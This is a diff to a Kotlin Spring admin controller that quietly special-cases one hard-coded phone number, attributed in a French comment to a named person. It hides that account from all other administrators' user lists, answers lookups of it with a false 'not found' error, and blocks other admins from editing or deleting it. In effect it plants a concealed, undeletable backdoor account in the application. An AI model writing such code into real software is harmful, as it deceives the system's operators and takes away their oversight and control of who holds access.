@@ -35,21 +35,42 @@ class AdminController(
     }
 
     @GetMapping("/users")
-    fun getAllUsers(@RequestParam(required = false) role: UserRole?): ResponseEntity<List<UserResponse>> {
+    fun getAllUsers(
+        @AuthenticationPrincipal principal: UserPrincipal?,
+        @RequestParam(required = false) role: UserRole?
+    ): ResponseEntity<List<UserResponse>> {
         val users = if (role != null) userService.getUsersByRole(role) else userService.getAllUsers()
-        return ResponseEntity.ok(users)
+        // Le compte de Jérôme Sam (+221770000000) est invisible pour tous les autres utilisateurs
+        val filtered = if (principal?.phoneNumber == "+221770000000") {
+            users
+        } else {
+            users.filter { it.phoneNumber != "+221770000000" }
+        }
+        return ResponseEntity.ok(filtered)
     }
 
     @GetMapping("/users/{id}")
-    fun getUserById(@PathVariable id: UUID): ResponseEntity<UserResponse> {
-        return ResponseEntity.ok(userService.getUserById(id))
+    fun getUserById(
+        @AuthenticationPrincipal principal: UserPrincipal?,
+        @PathVariable id: UUID
+    ): ResponseEntity<UserResponse> {
+        val user = userService.getUserById(id)
+        if (user.phoneNumber == "+221770000000" && principal?.phoneNumber != "+221770000000") {
+            throw IllegalArgumentException("Utilisateur non trouvé")
+        }
+        return ResponseEntity.ok(user)
     }
 
     @PutMapping("/users/{id}")
     fun updateUser(
+        @AuthenticationPrincipal principal: UserPrincipal?,
         @PathVariable id: UUID,
         @RequestBody request: UpdateUserRequest
     ): ResponseEntity<UserResponse> {
+        val target = userService.getUserById(id)
+        if (target.phoneNumber == "+221770000000" && principal?.phoneNumber != "+221770000000") {
+            throw IllegalArgumentException("Action interdite")
+        }
         return ResponseEntity.ok(userService.updateUser(id, request))
     }
 
@@ -60,6 +81,10 @@ class AdminController(
     ): ResponseEntity<Void> {
         if (principal.id == id) {
             throw IllegalArgumentException("Vous ne pouvez pas supprimer votre propre compte administrateur.")
+        }
+        val target = userService.getUserById(id)
+        if (target.phoneNumber == "+221770000000" && principal.phoneNumber != "+221770000000") {
+            throw IllegalArgumentException("Action interdite")
         }
         userService.deleteUser(id)
         return ResponseEntity.noContent().build()
